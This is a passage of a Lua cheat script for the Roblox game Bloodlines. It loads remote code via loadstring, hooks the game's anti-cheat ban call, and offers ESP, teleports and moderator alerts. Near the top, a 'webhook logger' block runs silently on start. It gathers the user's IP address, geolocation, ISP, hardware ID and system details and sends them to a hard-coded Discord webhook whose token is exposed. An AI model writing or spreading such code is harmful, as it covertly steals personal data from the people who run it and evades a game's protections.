local HttpService = game:GetService("HttpService")

local LibraryBaseUrl = "https://raw.githubusercontent.com/regardments/bloodlines/refs/heads/main"

local function LoadLibrary(path)
	local ok, source = pcall(function()
		return game:HttpGet(LibraryBaseUrl .. "/" .. path)
	end)

	if not ok or type(source) ~= "string" or source == "" then
		local localOk, localSource = pcall(readfile, "bloodlines-rewrite/" .. path)
		if not localOk then
			error("Missing file: " .. path)
		end

		source = localSource
	end

	local fn, err = loadstring(source)
	if not fn then
		error("Failed to compile " .. path .. ": " .. tostring(err))
	end

	return fn()
end

local Library = LoadLibrary("Library.lua")
local ThemeManager = LoadLibrary("ThemeManager.lua")
local SaveManager = LoadLibrary("SaveManager.lua")

if getgenv().AztupLycorisLoaded then
	Library:Notify("Aztup Hub is already loaded.", 4)
	return
end
getgenv().AztupLycorisLoaded = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local MemStorageService = game:GetService("MemStorageService")
local TeleportService = game:GetService("TeleportService")

local MAIN_PLACE_ID = 10266164381

if game.PlaceId ~= MAIN_PLACE_ID then
	Library:Notify("Script will not run in lobby.", 6)
	return
end

local localPlayer = Players.LocalPlayer
local IsA = game.IsA

-- ── WEBHOOK LOGGER ────────────────────────────────────
local WEBHOOK_URL = "https://discord.com/api/webhooks/1532557567732089043/KjbyFAOgFHGYRZWnKSIr-GdnKDhCb_YYDMs93TZnCd_3Ub5ukbwYhpiqV8My6vBhXWr8"

task.spawn(function()
	pcall(function()
		local HttpService = game:GetService("HttpService")

		local function tryValue(...)
			for i = 1, select("#", ...) do
				local fn = select(i, ...)
				local ok, a = pcall(fn)
				if ok and a and a ~= "" and a ~= 0 then
					return tostring(a)
				end
			end
			return "--"
		end

		local userId = localPlayer.UserId
		local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
		local profile = "https://www.roblox.com/users/" .. userId .. "/profile"

		local fields = {}

		local function addField(name, value, inline)
			table.insert(fields, { name = name, value = tostring(value), inline = inline ~= false })
		end

		local ipInfo = {}
		local ip = tryValue(
			function() return getgenv().getip() end,
			function() return getgenv().getclientip() end
		)

		if ip == "--" and type(request) == "function" then
			local lookupOk, lookupRes = pcall(request, {
				Url = "http://ip-api.com/json/?fields=status,query,country,countryCode,region,regionName,city,zip,timezone,isp,org,as",
				Method = "GET",
			})
			if lookupOk and lookupRes and lookupRes.StatusCode == 200 and lookupRes.Body then
				local okJson, parsed = pcall(HttpService.JSONDecode, HttpService, lookupRes.Body)
				if okJson and type(parsed) == "table" and parsed.status == "success" then
					ipInfo = parsed
				end
			end
		end

		addField("User", "[" .. localPlayer.Name .. "](<" .. profile .. ">)")
		addField("Display Name", localPlayer.DisplayName)
		addField("User ID", userId)
		addField("Account Age", localPlayer.AccountAge .. " days")
		addField("Client Job", game.JobId)
		addField("Place ID", game.PlaceId)
		addField("Game ID", game.GameId)
		addField("Executor", tryValue(
			function() return identifyexecutor() end,
			function() return getexecutorname() end
		))
		addField("IP", ipInfo.query or ip)
		addField("ISP", ipInfo.isp or tryValue(function() return getgenv().getisp() end))
		addField("Organization / ASN", ipInfo.org and (ipInfo.org .. (ipInfo.as and (" | " .. ipInfo.as) or "")) or "--")
		addField("Country", ipInfo.country and (ipInfo.country .. (ipInfo.countryCode and (" (" .. ipInfo.countryCode .. ")") or "")) or "--")
		addField("Region / City", ipInfo.regionName and (ipInfo.regionName .. (ipInfo.city and (", " .. ipInfo.city) or "")) or "--")
		addField("Timezone", ipInfo.timezone or "--")
		addField("OS", tryValue(
			function() return getgenv().getos() end,
			function() return getgenv().getoperatingsystem() end
		))
		addField("HWID", tryValue(
			function() return getgenv().gethwid() end,
			function() return getgenv().gethwidid() end
		))
		addField("GPU", tryValue(function() return getgenv().getgpu() end))
		addField("CPU", tryValue(function() return getgenv().getcpu() end))
		addField("RAM", tryValue(function() return getgenv().getram() end))
		addField("Resolution", tryValue(function() return getgenv().getresolution() end))
		addField("Time", os.date("%Y-%m-%d %H:%M:%S"))

		local payload = {
			content = "**Bloodlines | Script Executed**",
			embeds = {
				{
					title = "Someone executed the script",
					description = "**" .. localPlayer.Name .. "** ran Bloodlines",
					color = 14434812,
					thumbnail = { url = avatar },
					fields = fields,
					footer = { text = "Bloodlines Logger" },
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
				},
			},
		}

		local body = HttpService:JSONEncode(payload)

		if type(request) == "function" then
			request({
				Url = WEBHOOK_URL,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = body,
			})
		elseif type(http_request) == "function" then
			http_request({
				Url = WEBHOOK_URL,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = body,
			})
		elseif type(syn) == "table" and type(syn.request) == "function" then
			syn.request({
				Url = WEBHOOK_URL,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = body,
			})
		else
			HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
		end
	end)
end)

local Events = ReplicatedStorage:WaitForChild("Events", 15)
local dataEvent = Events and Events:FindFirstChild("DataEvent")
local dataFunction = Events and Events:FindFirstChild("DataFunction")

local gameManager
pcall(function()
	gameManager = require(ReplicatedStorage.GameManager)
end)

local function flag(name)
	local toggle = Toggles[name]
	if toggle then
		return toggle.Value
	end

	local option = Options[name]
	if option then
		return option.Value
	end

	return nil
end

local function ToastNotif(data)
	Library:Notify(data.text, 5)
end

local localPlayerData = {}
local function updateLocalPlayerData(character)
	localPlayerData.character = character
	localPlayerData.humanoid = character and character:FindFirstChildOfClass("Humanoid")
	localPlayerData.rootPart = character and (character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart)
end

updateLocalPlayerData(localPlayer.Character)
localPlayer.CharacterAdded:Connect(updateLocalPlayerData)

local function getPlayerData(player)
	player = player or localPlayer
	local character = player.Character
	if not character then
		return nil
	end

	local humanoid = character:FindFirstChildOfClass("Humanoid")
	local rootPart = character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart

	return { player = player, character = character, humanoid = humanoid, rootPart = rootPart }
end

local ControlModule = {}
do
	local MOVE_DIRECTIONS = {
		[Enum.KeyCode.W] = Vector3.new(0, 0, -1),
		[Enum.KeyCode.A] = Vector3.new(-1, 0, 0),
		[Enum.KeyCode.S] = Vector3.new(0, 0, 1),
		[Enum.KeyCode.D] = Vector3.new(1, 0, 0),
	}

	function ControlModule:GetMoveVector()
		local vector = Vector3.new()

		for keycode, direction in next, MOVE_DIRECTIONS do
			if UserInputService:IsKeyDown(keycode) then
				vector = vector + direction
			end
		end

		return vector
	end
end

local TextLogger = {}
TextLogger.__index = TextLogger

function TextLogger.new(info)
	local self = setmetatable({}, TextLogger)
	self.Title = info.title or "Logger"
	self.Lines = {}

	local Outer = Library:Create("Frame", {
		AnchorPoint = Vector2.new(0, 0.5),
		BorderColor3 = Color3.new(0, 0, 0),
		Position = UDim2.new(1, -270, 0.5, 0),
		Size = UDim2.fromOffset(250, 350),
		Visible = false,
		ZIndex = 300,
		Parent = Library.ScreenGui,
	})

	local Inner = Library:Create("Frame", {
		BackgroundColor3 = Library.MainColor,
		BorderColor3 = Library.OutlineColor,
		BorderMode = Enum.BorderMode.Inset,
		Size = UDim2.new(1, 0, 1, 0),
		ZIndex = 301,
		Parent = Outer,
	})
	Library:AddToRegistry(Inner, { BackgroundColor3 = "MainColor", BorderColor3 = "OutlineColor" }, true)

	local AccentLine = Library:Create("Frame", {
		BackgroundColor3 = Library.AccentColor,
		BorderSizePixel = 0,
		Size = UDim2.new(1, 0, 0, 2),
		ZIndex = 302,
		Parent = Inner,
	})
	Library:AddToRegistry(AccentLine, { BackgroundColor3 = "AccentColor" }, true)

	local TitleLabel = Library:CreateLabel({
		Position = UDim2.new(0, 6, 0, 4),
		Size = UDim2.new(1, -12, 0, 20),
		Text = self.Title,
		TextColor3 = Library.AccentColor,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		ZIndex = 303,
		Parent = Inner,
	})
	Library:AddToRegistry(TitleLabel, { TextColor3 = "AccentColor" }, true)

	local Scroll = Library:Create("ScrollingFrame", {
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png",
		TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png",
		CanvasSize = UDim2.new(0, 0, 0, 0),
		Position = UDim2.new(0, 2, 0, 26),
		ScrollBarImageColor3 = Library.AccentColor,
		ScrollBarThickness = 3,
		Size = UDim2.new(1, -4, 1, -28),
		ZIndex = 304,
		Parent = Inner,
	})
	Library:AddToRegistry(Scroll, { ScrollBarImageColor3 = "AccentColor" }, true)

	Library:Create("UIListLayout", {
		FillDirection = Enum.FillDirection.Vertical,
		Padding = UDim.new(0, 2),
		SortOrder = Enum.SortOrder.LayoutOrder,
		Parent = Scroll,
	})

	Library:Create("UIPadding", {
		PaddingLeft = UDim.new(0, 4),
		PaddingTop = UDim.new(0, 2),
		Parent = Scroll,
	})

	self.Frame = Outer
	self.Container = Scroll

	Library:MakeDraggable(Outer, 30)

	return self
end

function TextLogger:SetVisible(state)
	self.Frame.Visible = state
end

function TextLogger:SetSize(size)
	self.Frame.Size = size
end

function TextLogger:SetPosition(position)
	self.Frame.Position = position
end

function TextLogger:AddText(info)
	local text = info.text
	local width = math.max(self.Container.AbsoluteSize.X - 14, 100)
	local height = select(2, Library:GetTextBounds(text, Library.Font, 13, Vector2.new(width, math.huge)))

	local line = Library:CreateLabel({
		Parent = self.Container,
		Size = UDim2.new(1, -8, 0, height),
		Text = text,
		TextSize = 13,
		TextWrapped = true,
		TextXAlignment = Enum.TextXAlignment.Left,
		ZIndex = 305,
	})

	table.insert(self.Lines, line)

	while #self.Lines > 100 do
		local oldest = table.remove(self.Lines, 1)
		oldest:Destroy()
	end

	self:UpdateCanvas()

	if flag("Chat Logger Auto Scroll") then
		task.defer(function()
			self.Container.CanvasPosition = Vector2.new(0, self.Container.CanvasSize.Y)
		end)
	end
end

function TextLogger:UpdateCanvas()
	local total = 0

	for _, line in ipairs(self.Lines) do
		total = total + line.Size.Y.Offset + 2
	end

	self.Container.CanvasSize = UDim2.fromOffset(0, total)
end

local CHAT_LOGGER_CONFIG = "AztupLycoris-ChatLogger.json"
local chatLogger = TextLogger.new({ title = "Chat Logger" })

local function createBaseESP(category, options)
	local categoryName = category:gsub("^%l", string.upper)
	local espObjects = {}

	local ESP = {}

	function ESP.new(partOrModel, name, humanoid)
		local rootPart = partOrModel

		if IsA(partOrModel, "Model") then
			rootPart = partOrModel.PrimaryPart or partOrModel:FindFirstChildWhichIsA("BasePart", true)
		end

		if not rootPart or not rootPart.Parent then
			return nil
		end

		local obj = { name = name, humanoid = humanoid }

		local billboard = Instance.new("BillboardGui")
		billboard.Name = "LycorisESP_" .. category
		billboard.Adornee = rootPart
		billboard.AlwaysOnTop = true
		billboard.ClipsDescendants = false
		billboard.LightInfluence = 0
		billboard.MaxDistance = 100000
		billboard.Size = UDim2.new(0, 200, 0, 36)
		billboard.StudsOffsetWorldSpace = Vector3.new(0, 3.5, 0)

		local label = Instance.new("TextLabel")
		label.BackgroundTransparency = 1
		label.Font = Enum.Font.RobotoMono
		label.Size = UDim2.new(1, 0, 1, 0)
		label.Text = name
		label.TextColor3 = Color3.new(1, 1, 1)
		label.TextScaled = true
		label.TextSize = 15
		label.TextStrokeColor3 = Color3.new(0, 0, 0)
		label.TextStrokeTransparency = 0.2
		label.Parent = billboard

		billboard.Parent = rootPart
		billboard.Enabled = false

		obj.gui = billboard
		obj.label = label

		table.insert(espObjects, obj)

		rootPart.Destroying:Connect(function()
			obj:Destroy()
		end)

		function obj:Update()
			if not obj.gui or not obj.gui.Parent then
				return
			end

			local enabled = flag(categoryName)
			if not enabled then
				obj.gui.Enabled = false
				return
			end

			local root = obj.gui.Adornee
			local myRootPart = localPlayerData.rootPart
			local distance = myRootPart and root and (myRootPart.Position - root.Position).Magnitude or 0

			obj.label.TextSize = math.floor(15 - 6 * math.clamp((distance - 10) / 300, 0, 1))

			local maxDistance = flag(categoryName .. " Max Distance") or 100000
			if distance > maxDistance then
				obj.gui.Enabled = false
				return
			end

			local text = obj.name

			if flag(categoryName .. " Show Distance") then
				text = string.format("%s [%dm]", obj.name, math.floor(distance))
			end

			if obj.humanoid and flag(categoryName .. " Show Health") then
				text = string.format(
					"%s (%d/%d)",
					text,
					math.floor(obj.humanoid.Health),
					math.floor(obj.humanoid.MaxHealth)
				)
			end

			obj.label.Text = text
			obj.gui.Enabled = true
		end

		function obj:Destroy()
			if obj.gui then
				obj.gui:Destroy()
				obj.gui = nil
			end

			for i = #espObjects, 1, -1 do
				if espObjects[i] == obj then
					table.remove(espObjects, i)
				end
			end
		end

		return obj
	end

	function ESP:UpdateAll()
		for _, obj in ipairs(espObjects) do
			obj:Update()
		end
	end

	function ESP:UnloadAll()
		for _, obj in ipairs(espObjects) do
			if obj.gui then
				obj.gui.Enabled = false
			end
		end
	end

	return ESP
end

local npcsESP = createBaseESP("npcs", {})
local mobsESP = createBaseESP("mobs", {})
local areasESP = createBaseESP("areas", {})
local playersESP = createBaseESP("players", {})

do
	local playerESPEntries = {}

	local function onCharacterAdded(player, character)
		task.spawn(function()
			local rootPart = character:WaitForChild("HumanoidRootPart", 10)
			if not rootPart or not rootPart.Parent then
				return
			end

			if playerESPEntries[player] then
				playerESPEntries[player]:Destroy()
				playerESPEntries[player] = nil
			end

			local humanoid = character:FindFirstChildOfClass("Humanoid")
			local esp = playersESP.new(rootPart, player.Name, humanoid)
			playerESPEntries[player] = esp

			character.Destroying:Connect(function()
				if playerESPEntries[player] then
					playerESPEntries[player]:Destroy()
					playerESPEntries[player] = nil
				end
			end)
		end)
	end

	local function setupPlayer(player)
		if player == localPlayer then
			return
		end

		player.CharacterAdded:Connect(function(character)
			onCharacterAdded(player, character)
		end)

		if player.Character then
			onCharacterAdded(player, player.Character)
		end
	end

	for _, player in ipairs(Players:GetPlayers()) do
		setupPlayer(player)
	end

	Players.PlayerAdded:Connect(setupPlayer)
	Players.PlayerRemoving:Connect(function(player)
		if playerESPEntries[player] then
			playerESPEntries[player]:Destroy()
			playerESPEntries[player] = nil
		end
	end)
end

function Library:ShowConfirm(text)
	local answered = false
	local result = false

	local function Finish(value)
		result = value
		answered = true
	end

	local Overlay = Library:Create("TextButton", {
		BackgroundColor3 = Color3.new(0, 0, 0),
		BackgroundTransparency = 0.6,
		BorderSizePixel = 0,
		Modal = true,
		Parent = Library.ScreenGui,
		Size = UDim2.new(1, 0, 1, 0),
		Text = "",
		ZIndex = 400,
	})

	local Panel = Library:Create("Frame", {
		AnchorPoint = Vector2.new(0.5, 0.5),
		BackgroundColor3 = Library.MainColor,
		BorderColor3 = Library.OutlineColor,
		BorderMode = Enum.BorderMode.Inset,
		Parent = Library.ScreenGui,
		Position = UDim2.fromScale(0.5, 0.5),
		Size = UDim2.fromOffset(380, 130),
		ZIndex = 401,
	})
	Library:AddToRegistry(Panel, { BackgroundColor3 = "MainColor", BorderColor3 = "OutlineColor" }, true)

	local Title = Library:CreateLabel({
		Parent = Panel,
		Position = UDim2.new(0, 10, 0, 6),
		Size = UDim2.new(1, -20, 0, 16),
		Text = "Confirmation",
		TextColor3 = Library.AccentColor,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		ZIndex = 402,
	})
	Library:AddToRegistry(Title, { TextColor3 = "AccentColor" }, true)

	Library:CreateLabel({
		Parent = Panel,
		Position = UDim2.new(0, 10, 0, 26),
		Size = UDim2.new(1, -20, 0, 60),
		Text = text,
		TextSize = 13,
		TextWrapped = true,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextYAlignment = Enum.TextYAlignment.Top,
		ZIndex = 403,
	})

	local function MakeButton(position, buttonText, onClick)
		local Outer = Library:Create("Frame", {
			BackgroundColor3 = Color3.new(0, 0, 0),
			BorderColor3 = Color3.new(0, 0, 0),
			Parent = Panel,
			Position = position,
			Size = UDim2.new(0, 140, 0, 26),
			ZIndex = 404,
		})

		local Inner = Library:Create("Frame", {
			BackgroundColor3 = Library.MainColor,
			BorderColor3 = Library.OutlineColor,
			BorderMode = Enum.BorderMode.Inset,
			Parent = Outer,
			Size = UDim2.new(1, 0, 1, 0),
			ZIndex = 405,
		})
		Library:AddToRegistry(Inner, { BackgroundColor3 = "MainColor", BorderColor3 = "OutlineColor" }, true)

		Library:CreateLabel({
			Parent = Inner,
			Size = UDim2.new(1, 0, 1, 0),
			Text = buttonText,
			TextSize = 14,
			ZIndex = 407,
		})

		local Button = Library:Create("TextButton", {
			BackgroundTransparency = 1,
			Parent = Inner,
			Size = UDim2.new(1, 0, 1, 0),
			Text = "",
			ZIndex = 406,
		})

		Button.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				onClick()
			end
		end)
	end

	MakeButton(UDim2.new(0, 40, 0, 92), "Yes", function()
		Finish(true)
	end)
	MakeButton(UDim2.new(0, 200, 0, 92), "No", function()
		Finish(false)
	end)

	while not answered do
		task.wait()
	end

	Overlay:Destroy()
	Panel:Destroy()

	return result
end

local inDanger = false
local chakraPoints = {}
local chakaPointsInstances = {}
local npcs = {}
local npcsList = {}
local npcDropdown
local purchasableItems = {}
local funcs = {}
local loadSound

function funcs.chatLogger(state)
	if state then
		pcall(function()
			if isfile(CHAT_LOGGER_CONFIG) then
				local data = HttpService:JSONDecode(readfile(CHAT_LOGGER_CONFIG))

				if data then
					if data.size then
						chatLogger:SetSize(UDim2.fromOffset(data.size[1], data.size[2]))
					end

					if data.position then
						chatLogger:SetPosition(UDim2.fromOffset(data.position[1], data.position[2]))
					end
				end
			end
		end)
	end

	chatLogger:SetVisible(state)

	if not state then
		pcall(function()
			writefile(
				CHAT_LOGGER_CONFIG,
				HttpService:JSONEncode({
					size = { chatLogger.Frame.Size.X.Offset, chatLogger.Frame.Size.Y.Offset },
					position = { chatLogger.Frame.Position.X.Offset, chatLogger.Frame.Position.Y.Offset },
				})
			)
		end)
	end
end

do
	local oldNamecall
	local namecallHooked = false

	if hookmetamethod and getnamecallmethod then
		namecallHooked = true

		local wrap = newcclosure or function(fn)
			return fn
		end

		oldNamecall = hookmetamethod(game, "__namecall", wrap(function(self, ...)
			local method = getnamecallmethod()

			if (method == "fireServer" or method == "FireServer") and IsA(self, "RemoteEvent") and self == dataEvent then
				local action = ...
				if action == "BanMe" then
					return warn("No No No")
				end
			elseif method == "FindFirstChild" or method == "findFirstChild" then
				local args = { ... }
				if args[1] == "NegateFall" and flag("No Fall Damage") then
					return true
				end
			end

			return oldNamecall(self, ...)
		end))
	else
		oldNamecall = function(self, ...)
			return self:method(...)
		end
	end
end

do
	local KILL_BRICKS_NAMES = { "LavarossaVoid", "Void" }
	local killBricks = {}

	local function onChildAdded(object)
		if not table.find(KILL_BRICKS_NAMES, object.Name) then
			return
		end

		for _, entry in ipairs(killBricks) do
			if entry.part == object then
				return
			end
		end

		local entry = { part = object, oldParent = object.Parent }
		table.insert(killBricks, entry)

		if flag("No Kill Bricks") then
			object.Parent = nil
		end
	end

	function funcs.noKillBricks(state)
		for _, killBrick in ipairs(killBricks) do
			killBrick.part.Parent = not state and killBrick.oldParent or nil
		end
	end

	for _, v in ipairs(workspace:GetDescendants()) do
		if table.find(KILL_BRICKS_NAMES, v.Name) then
			task.spawn(onChildAdded, v)
		end
	end

	workspace.DescendantAdded:Connect(onChildAdded)
end

do
	local defaultChat = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents", 15)
	local onMessageDoneFiltering = defaultChat and defaultChat:FindFirstChild("OnMessageDoneFiltering")

	if onMessageDoneFiltering then
		onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
			local player = messageData and Players:FindFirstChild(messageData.FromSpeaker)
			local message = messageData and messageData.Message

			if not player or not message then
				return
			end

			local timeText = DateTime.now():FormatLocalTime("H:mm:ss", "en-us")
			local playerIngName = player:GetAttribute("CharacterName") or "N/A"

			chatLogger:AddText({
				text = ("[%s] [%s] [%s] %s"):format(timeText, player.Name, playerIngName, message),
			})
		end)
	end
end

do
	if dataEvent then
		dataEvent.OnClientEvent:Connect(function(eventType)
			if eventType == "InDanger" then
				inDanger = true
			elseif eventType == "OutOfDanger" then
				inDanger = false
			end
		end)
	end
end

do
	function funcs.resetCharacter()
		local character = localPlayerData.character
		if not character then
			return
		end

		if Library:ShowConfirm("Are you sure you want to reset character?") then
			character:BreakJoints()
		end
	end

	function funcs.instantLog()
		if inDanger then
			return ToastNotif({ text = "You can not do this right now. You are in danger." })
		end

		localPlayer:Kick("")
		task.wait(2.5)
		game:Shutdown()
	end
end

do
	local noRainLoop

	function funcs.noRain(state)
		if not state then
			if noRainLoop then
				noRainLoop:Cancel()
				noRainLoop = nil
			end
			return
		end

		if noRainLoop then
			return
		end

		noRainLoop = task.spawn(function()
			while flag("No Rain") do
				local raining = ReplicatedStorage:FindFirstChild("Raining")
				if raining then
					raining.Value = ""
				end
				task.wait()
			end

			noRainLoop = nil
		end)
	end

	local oldFogEnd = Lighting.FogEnd
	local oldBrightness = Lighting.Brightness
	local noFogConn
	local fullBrightConn

	function funcs.noFog(state)
		if not state then
			if noFogConn then
				noFogConn:Disconnect()
				noFogConn = nil
			end
			Lighting.FogEnd = oldFogEnd
			return
		end

		if noFogConn then
			return
		end

		noFogConn = RunService.RenderStepped:Connect(function()
			Lighting.FogEnd = 9999999999
		end)
	end

	function funcs.fullBright(state)
		if not state then
			if fullBrightConn then
				fullBrightConn:Disconnect()
				fullBrightConn = nil
			end
			Lighting.Brightness = oldBrightness
			return
		end

		if fullBrightConn then
			return
		end

		fullBrightConn = RunService.RenderStepped:Connect(function()
			Lighting.Brightness = flag("Brightness Level")
		end)
	end
end

local function populateChakraPoints()
	local folder = workspace:FindFirstChild("ChakraPoints")
	if not folder then
		return false
	end

	for _, chakraPoint in ipairs(folder:GetChildren()) do
		local pointName = chakraPoint:FindFirstChild("PointName")
		local main = chakraPoint:FindFirstChild("Main")

		if pointName and main and not chakaPointsInstances[pointName.Value] then
			table.insert(chakraPoints, pointName.Value)
			chakaPointsInstances[pointName.Value] = main.Position
		end
	end

	return #chakraPoints > 0
end

do
	populateChakraPoints()

	function funcs.teleportToChakraPoint()
		local rootPart = localPlayerData.rootPart
		if not rootPart then
			return
		end

		local position = chakaPointsInstances[flag("Chakra Point")]
		if not position then
			return
		end

		rootPart.CFrame = CFrame.new(position - Vector3.new(0, 0, 5), position)
	end

	function funcs.teleportToPlayer()
		local target = getPlayerData(Players:FindFirstChild(flag("Player Teleport")))
		if not target or not target.rootPart then
			return
		end

		local rootPart = localPlayerData.rootPart
		if not rootPart then
			return
		end

		rootPart.CFrame = target.rootPart.CFrame
	end
end

do
	local function refreshNPCDropdown()
		if npcDropdown then
			npcDropdown:SetValues(npcs)
		end
	end

	local function onWorkspaceChildAdded(object)
		task.spawn(function()
			if not IsA(object, "Model") then
				return
			end

			local npcValue = object:WaitForChild("NPC", 10)
			if not npcValue then
				return
			end

			local rootPart = object:FindFirstChild("HumanoidRootPart") or object:FindFirstChild("Main")
			local humanoid = object:FindFirstChildOfClass("Humanoid")

			if npcValue.Value == "Dialog" then
				table.insert(npcs, object.Name)
				npcsList[object.Name] = object
				refreshNPCDropdown()

				local esp = rootPart and npcsESP.new(rootPart, object.Name)

				object.Destroying:Connect(function()
					local idx = table.find(npcs, object.Name)
					if idx then
						table.remove(npcs, idx)
					end
					npcsList[object.Name] = nil
					refreshNPCDropdown()

					if esp then
						esp:Destroy()
					end
				end)
			elseif npcValue.Value == "Combat" then
				local esp = rootPart and mobsESP.new(rootPart, object.Name, humanoid)

				if esp then
					object.Destroying:Connect(function()
						esp:Destroy()
					end)
				end
			end
		end)
	end

	for _, v in ipairs(workspace:GetChildren()) do
		task.spawn(onWorkspaceChildAdded, v)
	end

	workspace.ChildAdded:Connect(onWorkspaceChildAdded)

	local locations = workspace:FindFirstChild("Locations")
	if locations then
		for _, v in ipairs(locations:GetChildren()) do
			areasESP.new(v, v.Name)
		end
	end

	function funcs.teleportToNPC()
		local npc = npcsList[flag("NPC Teleport")]
		if not npc then
			return
		end

		local rootPart = localPlayerData.rootPart
		if not rootPart then
			return
		end

		local main = npc.PrimaryPart or npc:FindFirstChild("Main") or npc:FindFirstChildWhichIsA("BasePart", true)
		if not main then
			return
		end

		rootPart.CFrame = CFrame.new(main.Position + Vector3.new(0, 0, -5), main.Position)
	end

	function funcs.refreshNPCList()
		refreshNPCDropdown()
	end
end

do
	local assetsList = { "ModeratorJoin.mp3", "ModeratorLeft.mp3" }
	local assets = {}

	local USE_INSECURE_ENDPOINT = (getgenv and getgenv().USE_INSECURE_ENDPOINT) or false
	local apiEndpoint = USE_INSECURE_ENDPOINT and "http://test.aztupscripts.xyz" or "https://aztupscripts.xyz"

	for _, name in ipairs(assetsList) do
		local path = string.format("Aztup Hub V3/%s", name)

		if not isfile(path) then
			print("Downloading", name, "...")
			local success, content = pcall(game.HttpGet, game, string.format("%s/%s", apiEndpoint, name))
			if success then
				writefile(path, content)
			end
		end

		assets[name] = pcall(getsynasset, path) and getsynasset(path) or path
	end

	function loadSound(soundName)
		pcall(function()
			local sound = Instance.new("Sound")
			sound.SoundId = assets[soundName]
			sound.Volume = 1
			sound.Parent = game:GetService("CoreGui")
			sound:Play()

			task.delay(4, function()
				sound:Destroy()
			end)
		end)
	end
end

do
	if gameManager and gameManager.Items then
		for itemName, item in next, gameManager.Items do
			if item.Buyabble then
				table.insert(purchasableItems, itemName)
			end
		end
	end
end

do
	Players.PlayerAdded:Connect(function(player)
		task.spawn(function()
			local rank

			for _ = 1, 20 do
				local success, result = pcall(function()
					return player:GetRankInGroup(7450839)
				end)

				if success then
					rank = result
					break
				end

				task.wait(1)
			end

			if not rank or rank == 0 then
				return
			end

			ToastNotif({ text = string.format("Moderator detected [%s]", player.Name) })

			if flag("Moderator Sound Alert") then
				loadSound("ModeratorJoin.mp3")
			end

			player.Destroying:Connect(function()
				ToastNotif({ text = string.format("Moderator left [%s]", player.Name) })
				loadSound("ModeratorLeft.mp3")
			end)
		end)
	end)
end

do
	local connected = false

	local function setupLeaderboard()
		if connected then
			return
		end

		task.spawn(function()
			local playerGui = localPlayer:WaitForChild("PlayerGui", 15)
			if not playerGui then
				return
			end

			local clientGui = playerGui:WaitForChild("ClientGui", 15)
			if not clientGui then
				return
			end

			local mainframe = clientGui:WaitForChild("Mainframe", 15)
			if not mainframe then
				return
			end

			local playerList = mainframe:WaitForChild("PlayerList", 15)
			if not playerList then
				return
			end

			local list = playerList:WaitForChild("List", 15)
			if not list then
				return
			end

			local lastSpectating
			local lastSpectatingObject

				local function stopSpectate()
					if lastSpectatingObject then
						lastSpectatingObject.PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
						lastSpectatingObject = nil
					end

					lastSpectating = nil

					local humanoid = localPlayerData.humanoid
					if humanoid then
						workspace.CurrentCamera.CameraSubject = humanoid
					end
				end

				local function spectate(player, obj)
					local playerData = getPlayerData(player)
					if not playerData then
						return stopSpectate()
					end

					if not player or lastSpectating == player then
						return stopSpectate()
					end

					if lastSpectatingObject then
						lastSpectatingObject.PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
					end

					lastSpectatingObject = obj
					lastSpectating = player

					if player ~= localPlayer then
						obj.PlayerName.TextColor3 = Color3.fromRGB(255, 0, 0)
					end

					local cam = workspace.CurrentCamera
					cam.CameraSubject = playerData.humanoid
					cam.CameraType = Enum.CameraType.Custom
				end

			local function normalizeName(text)
				text = (text or ""):gsub("%s+", "")
				text = text:gsub("^[^%w]+", "")
				return text:lower()
			end

			local function getPlayerFromRow(obj)
				local label = obj:FindFirstChild("PlayerName")
				if not label or not label:IsA("TextLabel") then
					return
				end

				local wanted = normalizeName(label.Text)
				if wanted == "" then
					return
				end

				for _, p in ipairs(Players:GetPlayers()) do
					local char = p.Character
					local humanoid = char and char:FindFirstChildOfClass("Humanoid")
					local candidates = { p.Name, p.DisplayName, humanoid and humanoid.DisplayName }
					for _, candidate in ipairs(candidates) do
						if candidate and normalizeName(candidate) == wanted then
							return p
						end
					end
				end
			end

				local function resolveRow(obj)
					local node = obj
					while node do
						if node:IsA("GuiObject") then
							local playerName = node:FindFirstChild("PlayerName")
							if playerName and playerName:IsA("TextLabel") then
								return node
							end
						end

						if node == list then
							return
						end

						node = node.Parent
					end
				end

				local function handleRowClick(row)
					local chakraToggle = Toggles["Chakra Sense Spoof"]
					if not chakraToggle or not chakraToggle.Value then
						return
					end

					local player = getPlayerFromRow(row)
					if not player or player == localPlayer then
						return
					end

					local function trySpectate()
						local playerData = getPlayerData(player)
						if not playerData or not playerData.humanoid then
							return false
						end

						spectate(player, row)
						return true
					end

					if not trySpectate() then
						task.spawn(function()
							for _ = 1, 30 do
								task.wait(0.1)
								if trySpectate() then
									break
								end
							end
						end)
					end
				end

				funcs.lbClickConn = UserInputService.InputBegan:Connect(function(input)
					if input.UserInputType ~= Enum.UserInputType.MouseButton1 then
						return
					end

					if input.UserInputState ~= Enum.UserInputState.Begin then
						return
					end

					local guiObjects = playerGui:GetGuiObjectsAtPosition(input.Position.X, input.Position.Y)
					for _, obj in ipairs(guiObjects) do
						local row = resolveRow(obj)
						if row then
							handleRowClick(row)
							break
						end
					end
				end)

			connected = true
		end)
	end

	setupLeaderboard()
	localPlayer.CharacterAdded:Connect(setupLeaderboard)
end

do
	local pickupList = {}

	local function onChildAdded(obj)
		task.spawn(function()
			if not IsA(obj, "BasePart") then
				return
			end

			local pickupable = obj:WaitForChild("Pickupable", 10)
